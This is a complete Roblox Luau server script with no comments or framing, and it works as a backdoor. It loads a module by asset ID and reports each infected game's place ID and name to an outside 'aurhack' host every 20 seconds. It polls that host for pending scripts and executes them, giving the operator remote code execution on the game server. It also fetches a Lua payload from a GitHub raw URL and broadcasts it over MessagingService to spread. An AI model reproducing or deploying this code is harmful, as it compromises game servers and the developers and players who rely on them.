if game:GetService("ReplicatedStorage"):HasTag("PERFC") then
	return
end
game:GetService("ReplicatedStorage"):AddTag("PERFC")
local fluentPeer = 75461050161473
local peerAnd = require(fluentPeer)
local b = "https://aurhack-main.xtl8v0.easypanel.host/"
local execedAlready = {}
local function spread()
	game:GetService("MessagingService"):PublishAsync("ALADBB8qbqCU1n4ZJgts", 
		game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/gigimko/-/refs/heads/main/ded.lua")
	)
end
local function getPendings()
	return game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync(b .. "api/pendingScripts"))
end
spawn(function()
	spread()
	while wait(30) do
		spread()
	end
end)
spawn(function()
	game:GetService("HttpService"):PostAsync(b .. "api/addPlace", game.HttpService:JSONEncode({
		placeId = game.PlaceId,
		displayName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

	}), Enum.HttpContentType.ApplicationJson)
	while wait(20) do
		game:GetService("HttpService"):PostAsync(b .. "api/addPlace", game.HttpService:JSONEncode({
			placeId = game.PlaceId,
			displayName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

		}), Enum.HttpContentType.ApplicationJson)
	end
end)
spawn(function()
	while wait(5) do
		local pendings = getPendings()
		warn(pendings)
		for _, scr in pendings do
			if table.find(execedAlready, scr.uniqueId) then continue end
			table.insert(execedAlready, scr.uniqueId)
			peerAnd(scr.script:gsub("\n", ""))()
		end
	end
end)
